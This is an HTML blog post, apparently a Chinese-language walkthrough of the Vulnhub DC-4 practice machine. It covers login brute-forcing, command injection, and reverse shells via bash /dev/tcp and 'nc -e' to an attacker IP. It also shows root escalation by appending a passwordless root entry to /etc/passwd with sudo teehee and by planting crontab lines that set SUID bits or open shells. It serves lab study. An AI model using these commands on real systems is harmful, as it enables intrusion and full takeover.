@@ -1,0 +1,578 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pepper">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC系列4">
+<meta property="og:url" content="http://example.com/2022/04/25/vulhub-DC4/index.html">
+<meta property="og:site_name" content="Pepper&#39;s home">
+<meta property="og:description" content="vulnhub靶场学习路线-全纪录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220429135105.jpg">
+<meta property="article:published_time" content="2022-04-25T06:10:41.000Z">
+<meta property="article:modified_time" content="2022-04-29T06:34:56.130Z">
+<meta property="article:author" content="pepper">
+<meta property="article:tag" content="靶场练习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220429135105.jpg">
+  
+  
+  <title>vulnhub-DC系列4 - Pepper&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/agate.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pepper’s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/window.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vulnhub-DC系列4">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-25 14:10" pubdate>
+        2022年4月25日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub-DC系列4</h1>
+            
+            <div class="markdown-body">
+              <h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1.写在前面"></a>1.写在前面</h3><blockquote>
+<p>这是DC系列的第5个，也是vulnhub靶场练习的第6篇文章。</p>
+<p>“我偏爱写诗的荒谬，胜过不写诗的荒谬” — 辛斯波卡</p>
+<p>Tips：DC4着重学习了有关提权的部分，学习了计划任务&amp;&amp;passwd明文写入提权姿势</p>
+</blockquote>
+<h3 id="2-知识点速记"><a href="#2-知识点速记" class="headerlink" title="2.知识点速记"></a>2.知识点速记</h3><ul>
+<li>远程命令执行(RMI)</li>
+<li>Linux关键文件&amp;内容检索</li>
+<li>sudo提权</li>
+<li>crontab计划任务提权</li>
+<li>passwd明文写入提权</li>
+</ul>
+<hr>
+<h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>直接去vulnhub官网下载 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">Vulnhub-DC4</a>对应的ova文件即可，然后拖入vmware。这里为了方便宿主机与靶机通讯，将虚拟机的网络模式设置为了<strong>NAT</strong>模式</p>
+<p>Win10 宿主机、kali2020 攻击机、vulnhub靶机 </p>
+<h3 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h3><p>环境配置好后，首先确认一下IP，在kali上查看当前IP为 192.168.114.128</p>
+<h4 id="4-1-常规探测"><a href="#4-1-常规探测" class="headerlink" title="4.1 常规探测"></a>4.1 常规探测</h4><p>对当前网段的主机探测，发现目标主机存在<code>192.168.114.134</code>存活，开放端口22，80。</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16508715951383.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" align="center"/></div>
+
+<p>进行全端口细致扫描，并未发现有其他端口开放，然后识别下版本信息：</p>
+<img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16508717432748.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" align="center"/>
+
+<p>访问下该http业务，发现是一个管理信息登录后台界面。常规思路，扫下目录和文件，未果。</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16508718648683.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" align="center"/></div>
+
+<hr>
+<h4 id="4-2-用户爆破"><a href="#4-2-用户爆破" class="headerlink" title="4.2 用户爆破"></a>4.2 用户爆破</h4><p>得了，拿出传统艺能爆破吧，找个好使的字典，账号盲猜就是admin，真就扫出了密码<code>happy</code> 。</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1650874224454.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<p>登录系统后，发现后台页面可以发起系统命令请求，于是抓包查看：</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1650875060727.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<hr>
+<h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5. 漏洞利用"></a>5. 漏洞利用</h3><h4 id="5-1-远程命令执行"><a href="#5-1-远程命令执行" class="headerlink" title="5.1 远程命令执行"></a>5.1 远程命令执行</h4><blockquote>
+<p><strong>知识点1：远程命令执行（RMI）</strong></p>
+<p>远程命令执行漏洞是Web系统常见漏洞类型，一般可直接getshell。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16508751132532.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面的命令是列举目录，我们修改radio的值就可以执行想要的命令：</p>
+<p>直接使用<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code> 但命令中因为存在<code>&gt;</code>标签而被截断</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16508760525171.png" srcset="/img/loading.gif" lazyload></p>
+<p>换个nc命令测试一下，发现可以哦：</p>
+<blockquote>
+<p>这里任何能进行shell反弹的命令都行</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15609609.html">Linux 反弹shell 总集篇 </a></p>
+</blockquote>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509446243573.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<p>直接进入了jim用户家目录下，看了下除了<code>jim</code>还有<code>charles</code>和<code>sam</code>用户：</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509447502625.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<hr>
+<h4 id="5-2-ssh登录爆破"><a href="#5-2-ssh登录爆破" class="headerlink" title="5.2 ssh登录爆破"></a>5.2 ssh登录爆破</h4><p>bucakups里面存储的是历史密码，好家伙，爆破梅开二度：</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509529384549.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<p>这里用msf模块爆破，还能弹回来个shell</p>
+<p>用户密码： <code>jim/jibril04</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509544313751.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6. 提权"></a>6. 提权</h3><h4 id="6-1-SUID提权"><a href="#6-1-SUID提权" class="headerlink" title="6.1 SUID提权"></a><del>6.1 SUID提权</del></h4><p>我们登录到jim用户，其实之前jim下还有个test.sh脚本，而且带有s标志位。</p>
+<p>在这里想了很多办法，包括修改脚本文件，但终究是无法提权。</p>
+<blockquote>
+<p><strong>坑点1：s标志位提权</strong></p>
+<p>这里test.sh的属主是jim本身，并不是root权限，所以再怎么提权也无法提到root</p>
+</blockquote>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509546356576.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" align="center"/></div>
+
+<hr>
+<h4 id="6-2-sudo-teehee-提权"><a href="#6-2-sudo-teehee-提权" class="headerlink" title="6.2 sudo-teehee 提权"></a>6.2 sudo-teehee 提权</h4><p>此外，已经有了ssh的账号密码，我们直接ssh过去，毕竟shell友好：</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509596017946.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" align="center"/></div>
+
+<p>其实这里登录的时候也提示了有新邮件，当时没注意到：</p>
+<p>这里找一下有关mail的目录：</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509596982367.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" align="center"/></div>
+
+<p>当然，也可以找下存在指定内容的文件。</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16511268274154.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" align="center"/></div>
+
+<p>于是，在jim的收件箱里发现charles发的邮件，charles要休假，所以把密码给了jim….</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509600582493.png" srcset="/img/loading.gif" lazyload></p>
+<p>账号密码：<code>Charles / ^xHhA&amp;hvim0y</code>，那我们转到charles来看看。</p>
+<p>这里列举一些常规的提权思路：</p>
+<ul>
+<li>系统内核漏洞 —— 获取版本 + 自检脚本</li>
+<li>sudo 提权 —— 列举当前用户可sudo的程序</li>
+<li>suid 提权 —— 发现具有root权限的s标志位程序</li>
+</ul>
+<p>这里<code>sudo -l</code> 发现charles用户可以免密执行<code>teehee</code>，但teehee是啥命令？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16509640153537.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里 <code>--help</code> 查看下teehee是啥玩意。</p>
+<blockquote>
+<p>teehee：该命令可以将标准输入写入文件及标准输出中</p>
+<p>使用 -a 将标准输入追加到指定文件</p>
+</blockquote>
+<h5 id="6-2-1-passwd明文写入"><a href="#6-2-1-passwd明文写入" class="headerlink" title="6.2.1 passwd明文写入"></a>6.2.1 passwd明文写入</h5><blockquote>
+<p><strong>知识点2：passwd明文写入</strong></p>
+<p>passwd记录的是系统的账号密码，若具有写权限，可写入明文密码</p>
+<p>从而覆盖shadow文件中的密码</p>
+</blockquote>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220428184041915.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" align="center"/></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">用户名:是否有密码保护(x即有保护):uid:gid:全称:home目录:/bin/bash<br><span class="hljs-built_in">tee</span>::0:0:<span class="hljs-built_in">tee</span>::/bin/bash<br></code></pre></div></td></tr></table></figure>
+
+<p>然后我们登录下tee用户（这里没有密码）</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220429131755677.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" align="center"/></div>
+
+<p>注意，这里可能生效需要一段时间，反正我重启了虚拟机才可以登录….</p>
+<hr>
+<h5 id="6-2-2-计划任务"><a href="#6-2-2-计划任务" class="headerlink" title="6.2.2 计划任务"></a>6.2.2 计划任务</h5><blockquote>
+<p><strong>知识点3：</strong>crontab计划任务</p>
+<p>若crontab具有写权限，可通过写入计划任务执行提权命令</p>
+</blockquote>
+<p><strong>方式一：</strong></p>
+<p>给<code>/bin/bash、/bin/sh</code>添加+s权限，即SUID标志位</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"> m  h day month week user <span class="hljs-built_in">command</span><br>*/1 * * * * root <span class="hljs-built_in">chmod</span> 4777 /bin/bash;<br>*/1 * * * * root <span class="hljs-built_in">chmod</span> 4777 /bin/sh;<br></code></pre></div></td></tr></table></figure>
+
+<blockquote>
+<p><strong>坑点2：bash -p 及 EUID</strong></p>
+<p>bash在执行的时候，如果发现EUID和当前UID不同，会强制转到UID</p>
+<p>需要 -p 取消强制转换，直接以EUID执行</p>
+</blockquote>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16510456549059.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" align="center"/></div>
+
+<p>下面直接运行<code>/bin/bash</code>，返回的是charles，这里可以理解为suid只是借用了root的权限在执行。</p>
+<p>所以这里要写<code>/bin/bash -p</code> 才能返回root权限。</p>
+<div align=center><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16510456709308.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" align="center"/></div>
+
+<hr>
+<p><strong>方式二：</strong></p>
+<p>执行nc命令反弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16510460037355.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">*/1 * * * * root nc -e /bin/bash 192.168.114.128 1515<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p><strong>方式三：</strong></p>
+<p>执行bash脚本反弹</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># bash.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; 192.168.114.128/5555 0&gt;&amp;1<br><br><span class="hljs-comment"># /etc/crontab</span><br>*/1 * * * * root /tmp/bash.sh<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16510571141731.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>注意：这里需要区别于SUID的执行权限</strong></p>
+<p>通过crontab执行bash脚本时，EUID和UID都是root，所以不加-p参数也能返回root权限！</p>
+<p>而之前给bash赋予4777权限，如果不加-p，则执行时EUID(0)和UID(非root)不同</p>
+<p>导致无法返回root权限！</p>
+<hr>
+<h3 id="7-写在结尾"><a href="#7-写在结尾" class="headerlink" title="7.写在结尾"></a>7.写在结尾</h3><p>DC4重点学习在于扩展提权方式和提权思路：<strong>crontab提权、passwd明文提权</strong></p>
+<p><strong>几个比较好的WP：</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/masses0x1/p/15780883.html">vulnhub DC4 靶场练习</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677119/article/details/111851852">Vulnhub靶机渗透测试-teehee命令提权</a></p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">vulnhub靶场练习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/18/vulnhub-DC3/">
+                        <span class="hidden-mobile">vulnhub-DC系列3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
